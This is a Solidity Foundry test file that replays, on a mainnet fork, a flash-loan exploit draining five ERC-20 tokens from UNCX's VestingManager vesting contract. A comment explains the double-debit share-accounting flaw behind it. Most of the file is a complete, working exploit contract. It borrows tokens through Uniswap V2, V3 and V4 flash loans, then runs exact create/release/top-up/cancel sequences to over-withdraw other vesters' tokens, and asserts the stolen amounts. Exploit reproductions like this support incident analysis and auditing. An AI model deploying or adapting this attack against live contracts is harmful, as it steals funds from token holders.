// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// UNCX Network - Smart Token Vesting (VestingManager) shared-pool share-accounting drain.
// Ethereum mainnet, 2026-10-14 (block 26191745, fork at parent 26191744). ~88-89K USD across
// five ERC-20s (EDGEN, ZC, pepecoin, LO0P, $PAAL), ~85.6K retained after flash-loan repayment.
//
// Exploit tx      : 0x352065378c4a41b77e5b6a1e5b5616cd2886c3e1a2c87ed3db8e5ddddc23823d
// Attacker EOA    : 0x78C9B11853E4f183a34C63fFd1924d2319a2f5B3
// Exploit contract: 0xf6D072254Eb8A9B06e0bA21221b498332C1BC35E
// Victim          : 0xA98F06312b7614523d0f5e725e15fd20fB1b99F5 (VestingManager, verified on Etherscan,
//                   solc 0.8.27, non-proxy; all logic below read from that source)
//
// Root cause (all three points confirmed against the verified source, not assumed):
//
//  1. release() pays a slice of the ENTIRE shared pool, not the position's own deposit.
//       uint256 balance = IERC20(schedule.token).balanceOf(address(this));
//       uint256 amount  = (releasableShares * balance) / _totalTokenShares[schedule.token];
//     Every deposit of a given token is pooled in the one VestingManager contract and tracked
//     only by "shares". A position's payout scales with the full contract balance and with the
//     global share denominator _totalTokenShares, so shrinking that denominator inflates every
//     holder's payout fraction - including the attacker's own.
//
//  2. release() and cancel() double-debit _totalTokenShares.
//     release() does `_totalTokenShares[token] -= releasableShares; schedule.released += releasableShares;`
//     but never reduces the position's _depositedShares. cancel() then computes
//       vestedShare   = vestedAmount * _depositedShares[vestingId] / schedule.totalAmount;
//       sharesToRemove = _depositedShares[vestingId] - vestedShare;   // ignores schedule.released
//       _totalTokenShares[token] -= sharesToRemove;
//     Because _depositedShares still carries the shares already taken out by release(), cancel()
//     debits those same shares from the global total a second time. The denominator is driven
//     below the shares actually backed by the pool, so the surviving positions over-pay.
//
//  3. A vesting whose tranche times are already in the past is 100% releasable immediately.
//     _getReleasableShares() vests by calculator.calculateVestedAmount(tranches, block.timestamp).
//     Fork timestamp is 1791992999; the attacker's create tranches end at 1791992998 (one second
//     earlier), so each created vesting is fully vested the moment it exists and can be released
//     and cancelled inside the same transaction.
//
// Mechanism is fully permissionless. createVesting / createAirdropVesting / topUpVesting / cancel /
// release carry no owner, role or signature gate - any address may create and manage its own
// vestings. The attacker is a plain EOA operating its own positions through its own contract.
// Per token the attacker: creates one "payout" vesting holding the real target amount, creates one
// or two soft+topable helper vestings, releases the helpers (debiting _totalTokenShares while
// leaving _depositedShares intact), optionally donates spare token straight into the pool to raise
// the balance, tops the helpers up and cancels them (the second, double-counted debit of the same
// shares), then releases the payout vesting against the now-corrupted denominator and the inflated
// balance, over-withdrawing the other vesters' backing tokens.
//
// Working capital is flash-borrowed per token and repaid in the same leg, exactly as on-chain:
//   EDGEN  - Uniswap V3 pool 0x4B2C930F...dD03e flash(), repaid principal + 1% fee
//   ZC     - Uniswap V4 PoolManager 0x0000...4444c unlock()/take()/settle(), repaid exact principal
//   pepecoin - Uniswap V2 pair 0xddd2...6aff flash swap, repaid principal * 1000/997
//   LO0P   - Uniswap V4 PoolManager unlock()/take()/settle(), repaid exact principal
//   $PAAL  - Uniswap V2 pair 0x2a6c...259f flash swap, repaid principal * 1000/997
// Profit is measured strictly as each token balance the exploit contract retains AFTER every flash
// loan is repaid, so the loans net to zero and only the stolen backing tokens are counted. The
// VestingManager is driven with real typed calls at mainnet state - no attacker bytecode or
// calldata replay; create/topUp/cancel/release arguments are the attacker's own on-chain inputs.
//
// Retained per token (flash loans fully repaid), read from the tx transfer logs:
//   EDGEN    55,601,598.708417972560603048  (18 dec)  0xAa9806c9...AE02Ca
//   ZC        9,055,847.637887682268154756  (18 dec)  0x4E67DB19...298722
//   pepecoin     40,155.284285661160205717  (18 dec)  0xA9E8aCf0...a9489A
//   LO0P         65,372.217059159993437512  (18 dec)  0x00000000...c1De3F
//   $PAAL       113,657.766933968           ( 9 dec)  0x14feE680...D10e16
//
// The two Uniswap V4 legs settle through the PoolManager, which uses transient storage, so the run
// needs the cancun EVM. It is passed on the command line; the repo foundry.toml (evm_version
// 'shanghai') is left unchanged.
//
// Run (self-contained mainnet archive fork):
//   forge test --contracts ./src/test/2026-10/UNCXSmartTokenVesting_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IVestingManager {
    // IVestingCalculator.TimeAmount { uint256 time; uint256 amount; EquationType eqType; }
    // EquationType is an enum; its zero value encodes as uint8 0, matching the attacker's tranches.
    struct TimeAmount {
        uint256 time;
        uint256 amount;
        uint8 eqType;
    }

    function createVesting(
        address token,
        TimeAmount[] calldata tranches,
        address beneficiary,
        bool isSoft,
        bool isNftized,
        bool isTransferable,
        bool isTopable
    ) external payable returns (uint256);

    function createAirdropVesting(
        address token,
        TimeAmount[] calldata tranches,
        address[] calldata beneficiaries,
        bool isSoft,
        bool isNftized,
        bool isTransferable,
        bool isTopable
    ) external payable returns (uint256[] memory);

    function topUpVesting(uint256 vestingId, TimeAmount[] calldata additionalTranches) external;
    function cancel(uint256 vestingId) external;
    function release(uint256 vestingId) external;
}

interface IUniswapV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function settle() external payable returns (uint256);
}

contract UNCXVestingExploit {
    address internal constant VM = 0xA98F06312b7614523d0f5e725e15fd20fB1b99F5;

    address internal constant EDGEN = 0xAa9806c938836627Ed1a41Ae871c7E1889AE02Ca;
    address internal constant ZC = 0x4E67DB19044549fF420860834c91b45BaD298722;
    address internal constant PEPE = 0xA9E8aCf069C58aEc8825542845Fd754e41a9489A; // "pepecoin"
    address internal constant LOOP = 0x00000000000050806673B532D7486ac114c1De3F; // "LO0P"
    address internal constant PAAL = 0x14feE680690900BA0ccCfC76AD70Fd1b95D10e16; // "$PAAL"

    address internal constant UNIV3_EDGEN = 0x4B2C930F88a87D1BfFaC291b6a7e01c9F13dD03e;
    address internal constant UNIV2_PEPE = 0xDDd23787a6B80A794d952f5fb036D0b31A8E6aff;
    address internal constant UNIV2_PAAL = 0x2a6c340bCbb0a79D3deecD3bc5cBc2605ea9259f;
    address internal constant UNIV4_PM = 0x000000000004444c5dc75cB358380D2e3dE08A90;

    uint256 internal constant EDGEN_BORROW = 131_769_607_356_179_331_729_743_626;
    uint256 internal constant PEPE_BORROW = 531_437_174_022_481_383_511_735;
    uint256 internal constant PAAL_BORROW = 494_701_979_586_570;
    uint256 internal constant ZC_TAKE = 47_059_196_744_096_272_543_282_784;
    uint256 internal constant LOOP_TAKE = 280_857_955_066_472_266_672_982;

    uint256 internal constant FLAT_FEE = 0.05 ether;

    // Create tranche end-points: both one second on either side of the fork timestamp so the
    // second (cumulative) point is already fully vested. Top-up points are pushed into the future.
    uint256 internal constant T1 = 1_791_992_997;
    uint256 internal constant T2 = 1_791_992_998;
    uint256 internal constant TA = 1_792_079_399;
    uint256 internal constant TB = 1_792_165_799;

    function attack() external {
        // EDGEN via Uniswap V3 flash
        IUniswapV3Pool(UNIV3_EDGEN).flash(address(this), EDGEN_BORROW, 0, "");
        // ZC via Uniswap V4 flash accounting
        IPoolManager(UNIV4_PM).unlock(abi.encode(uint8(0)));
        // pepecoin via Uniswap V2 flash swap (token0)
        IUniswapV2Pair(UNIV2_PEPE).swap(PEPE_BORROW, 0, address(this), "pepe");
        // LO0P via Uniswap V4 flash accounting
        IPoolManager(UNIV4_PM).unlock(abi.encode(uint8(1)));
        // $PAAL via Uniswap V2 flash swap (token0)
        IUniswapV2Pair(UNIV2_PAAL).swap(PAAL_BORROW, 0, address(this), "paal");
    }

    // ----- flash-loan callbacks -----

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        require(msg.sender == UNIV3_EDGEN, "bad v3 pool");
        _drainEdgen();
        IERC20(EDGEN).transfer(UNIV3_EDGEN, EDGEN_BORROW + fee0);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("pepe")) {
            require(msg.sender == UNIV2_PEPE, "bad v2 pair");
            _drainPepe();
            IERC20(PEPE).transfer(UNIV2_PEPE, (PEPE_BORROW * 1000) / 997 + 1);
        } else {
            require(msg.sender == UNIV2_PAAL, "bad v2 pair");
            _drainPaal();
            IERC20(PAAL).transfer(UNIV2_PAAL, (PAAL_BORROW * 1000) / 997 + 1);
        }
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == UNIV4_PM, "bad pool manager");
        uint8 which = abi.decode(data, (uint8));
        if (which == 0) {
            IPoolManager(UNIV4_PM).take(ZC, address(this), ZC_TAKE);
            _drainZc();
            IPoolManager(UNIV4_PM).sync(ZC);
            IERC20(ZC).transfer(UNIV4_PM, ZC_TAKE);
            IPoolManager(UNIV4_PM).settle();
        } else {
            IPoolManager(UNIV4_PM).take(LOOP, address(this), LOOP_TAKE);
            _drainLoop();
            IPoolManager(UNIV4_PM).sync(LOOP);
            IERC20(LOOP).transfer(UNIV4_PM, LOOP_TAKE);
            IPoolManager(UNIV4_PM).settle();
        }
        return "";
    }

    // ----- per-token drains (exact on-chain call sequences) -----

    function _drainEdgen() internal {
        IERC20(EDGEN).approve(VM, type(uint256).max);
        uint256 payout = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            EDGEN, _create(57_344_850_920_662_031_757_537), address(this), false, false, false, false
        );
        uint256 h1 = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            EDGEN, _create(131_319_708_608_316_052_724_761_594), address(this), true, false, false, true
        );
        IVestingManager(VM).release(h1);
        uint256 h2 = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            EDGEN, _create(131_319_708_608_316_052_724_761_594), address(this), true, false, false, true
        );
        IVestingManager(VM).release(h2);
        IERC20(EDGEN).transfer(VM, 49_725_755_695_478_956_273_916_705); // donation into the pool
        IVestingManager(VM).topUpVesting(
            h1, _topUp(131_319_708_608_316_052_724_761_594, 212_618_077_207_047_821_767_740_528)
        );
        IVestingManager(VM).cancel(h1);
        IVestingManager(VM).topUpVesting(
            h2, _topUp(131_319_708_608_316_052_724_761_594, 212_618_077_207_047_821_767_740_528)
        );
        IVestingManager(VM).cancel(h2);
        IVestingManager(VM).release(payout);
    }

    function _drainZc() internal {
        IERC20(ZC).approve(VM, type(uint256).max);
        uint256 payout = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            ZC, _create(73_333_333_333_333_333_333_333), address(this), false, false, false, false
        );
        uint256 helper = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            ZC, _create(46_860_000_000_000_000_000_000_000), address(this), true, false, false, true
        );
        IVestingManager(VM).release(helper);
        IERC20(ZC).transfer(VM, 18_013_033_004_096_272_539_846_540);
        IVestingManager(VM).topUpVesting(
            helper, _topUp(46_860_000_000_000_000_000_000_000, 75_710_213_333_333_333_000_000_000)
        );
        IVestingManager(VM).cancel(helper);
        IVestingManager(VM).release(payout);
    }

    function _drainPepe() internal {
        IERC20(PEPE).approve(VM, type(uint256).max);
        address[] memory bens = new address[](2);
        bens[0] = address(this);
        bens[1] = address(this);
        uint256[] memory ids = IVestingManager(VM).createAirdropVesting{value: FLAT_FEE}(
            PEPE, _create(127_468_440_700_974_947_074_572), bens, true, false, false, true
        );
        uint256 payout = ids[0];
        uint256 helper = ids[1];
        IVestingManager(VM).release(helper);
        IERC20(PEPE).transfer(VM, 212_447_401_168_291_578_457_620);
        IVestingManager(VM).topUpVesting(
            helper, _topUp(127_468_440_700_974_947_074_572, 318_543_633_311_736_392_739_356)
        );
        IVestingManager(VM).cancel(helper);
        IVestingManager(VM).release(payout);
    }

    function _drainLoop() internal {
        IERC20(LOOP).approve(VM, type(uint256).max);
        uint256 payout = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            LOOP, _create(438_840_000_000_000_000_000), address(this), false, false, false, false
        );
        uint256 helper = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            LOOP, _create(280_418_760_000_000_000_000_000), address(this), true, false, false, true
        );
        IVestingManager(VM).release(helper);
        IERC20(LOOP).transfer(VM, 107_040_430_125_632_266_672_982);
        IVestingManager(VM).topUpVesting(
            helper, _topUp(280_418_760_000_000_000_000_000, 453_063_682_080_000_000_000_000)
        );
        IVestingManager(VM).cancel(helper);
        IVestingManager(VM).release(payout);
    }

    function _drainPaal() internal {
        IERC20(PAAL).approve(VM, type(uint256).max);
        uint256 payout = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            PAAL, _create(772_970_865_896), address(this), false, false, false, false
        );
        uint256 helper = IVestingManager(VM).createVesting{value: FLAT_FEE}(
            PAAL, _create(493_928_383_308_136), address(this), true, false, false, true
        );
        IVestingManager(VM).release(helper);
        IERC20(PAAL).transfer(VM, 188_540_547_717_140);
        IVestingManager(VM).topUpVesting(helper, _topUp(493_928_383_308_136, 798_024_397_602_377));
        IVestingManager(VM).cancel(helper);
        IVestingManager(VM).release(payout);
    }

    // Two-point cumulative schedule, both points already elapsed at the fork timestamp.
    function _create(uint256 amount) internal pure returns (IVestingManager.TimeAmount[] memory t) {
        t = new IVestingManager.TimeAmount[](2);
        t[0] = IVestingManager.TimeAmount(T1, 0, 0);
        t[1] = IVestingManager.TimeAmount(T2, amount, 0);
    }

    // Future top-up points: first point >= current total, final cumulative > current total.
    function _topUp(uint256 a, uint256 b) internal pure returns (IVestingManager.TimeAmount[] memory t) {
        t = new IVestingManager.TimeAmount[](2);
        t[0] = IVestingManager.TimeAmount(TA, a, 0);
        t[1] = IVestingManager.TimeAmount(TB, b, 0);
    }

    receive() external payable {}
}

contract UNCXSmartTokenVesting_exp is Test {
    uint256 internal constant ATTACK_BLOCK = 26191745;

    address internal constant VM = 0xA98F06312b7614523d0f5e725e15fd20fB1b99F5;
    address internal constant EDGEN = 0xAa9806c938836627Ed1a41Ae871c7E1889AE02Ca;
    address internal constant ZC = 0x4E67DB19044549fF420860834c91b45BaD298722;
    address internal constant PEPE = 0xA9E8aCf069C58aEc8825542845Fd754e41a9489A;
    address internal constant LOOP = 0x00000000000050806673B532D7486ac114c1De3F;
    address internal constant PAAL = 0x14feE680690900BA0ccCfC76AD70Fd1b95D10e16;

    // Retained per token after every flash loan is repaid (from the tx transfer logs).
    uint256 internal constant EDGEN_PROFIT = 55_601_598_708_417_972_560_603_048;
    uint256 internal constant ZC_PROFIT = 9_055_847_637_887_682_268_154_756;
    uint256 internal constant PEPE_PROFIT = 40_155_284_285_661_160_205_717;
    uint256 internal constant LOOP_PROFIT = 65_372_217_059_159_993_437_512;
    uint256 internal constant PAAL_PROFIT = 113_657_766_933_968;

    string internal constant MAINNET_ARCHIVE = "https://eth-mainnet.public.blastapi.io";

    function setUp() public {
        vm.createSelectFork(MAINNET_ARCHIVE, ATTACK_BLOCK - 1);
        // Match the attack block timestamp so the already-elapsed create tranches (ending at
        // 1791992998) read as fully vested, exactly as when the transaction executed.
        vm.warp(1_791_992_999);
    }

    function testExploit() public {
        UNCXVestingExploit atk = new UNCXVestingExploit();
        vm.deal(address(atk), 1 ether); // covers the 0.05 ETH flat fee per created vesting

        atk.attack();

        uint256 edgen = IERC20(EDGEN).balanceOf(address(atk));
        uint256 zc = IERC20(ZC).balanceOf(address(atk));
        uint256 pepe = IERC20(PEPE).balanceOf(address(atk));
        uint256 loop = IERC20(LOOP).balanceOf(address(atk));
        uint256 paal = IERC20(PAAL).balanceOf(address(atk));

        emit log_named_decimal_uint("EDGEN drained (net of flash repay)", edgen, 18);
        emit log_named_decimal_uint("ZC drained (net of flash repay)", zc, 18);
        emit log_named_decimal_uint("pepecoin drained (net of flash repay)", pepe, 18);
        emit log_named_decimal_uint("LO0P drained (net of flash repay)", loop, 18);
        emit log_named_decimal_uint("PAAL drained (net of flash repay)", paal, 9);

        // Each figure is the token the exploit contract keeps after the flash loan nets to zero.
        assertApproxEqAbs(edgen, EDGEN_PROFIT, 1e18, "EDGEN");
        assertApproxEqAbs(zc, ZC_PROFIT, 1e18, "ZC");
        assertApproxEqAbs(pepe, PEPE_PROFIT, 1e18, "pepecoin");
        assertApproxEqAbs(loop, LOOP_PROFIT, 1e18, "LO0P");
        assertApproxEqAbs(paal, PAAL_PROFIT, 1e9, "PAAL");
    }
}
